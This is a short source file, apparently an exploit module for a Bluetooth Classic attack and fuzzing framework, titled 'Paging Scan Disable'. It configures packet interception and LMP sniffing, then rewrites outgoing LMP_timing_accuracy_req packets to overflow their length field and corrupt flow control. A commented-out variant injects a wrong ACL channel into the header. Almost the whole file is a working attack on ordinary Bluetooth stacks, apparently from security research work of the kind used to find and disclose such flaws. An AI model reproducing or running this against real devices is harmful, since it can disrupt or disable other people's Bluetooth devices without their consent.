#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Setup
static const char *module_name()
{
    return "Paging Scan Disable";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 1500;
    config->bluetooth.disable_role_switch = false;
    config->bluetooth.randomize_own_bt_address = false;
    config->options.auto_start = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static uint flag = 0;

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // 1
    // Wait for LMP_timing_accuracy_req
    if (pkt_length >= 5 && IS_LMP_OPCODE(pkt_buf, 47))
    {
        flag = 1;
        // Overflow LMP packet
        pkt_buf[2] = (31 << 3) | 7;
        // Enable below to trigger non compliance caused due to some flow control corruption
        pkt_buf[3] = 0x46;
        return 1;
    }

    // Wait for LMP_feature_req
    // if (flag && pkt_length >= 5 && IS_LMP_OPCODE(pkt_buf, 39))
    // {
    //     flag = 0;
    //     // Change packet header channel to wrong ACL channel
    //     pkt_buf[0] = 0x6a;
    //     pkt_buf[5] = 0x3c;

    //     return 1;
    // }

    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}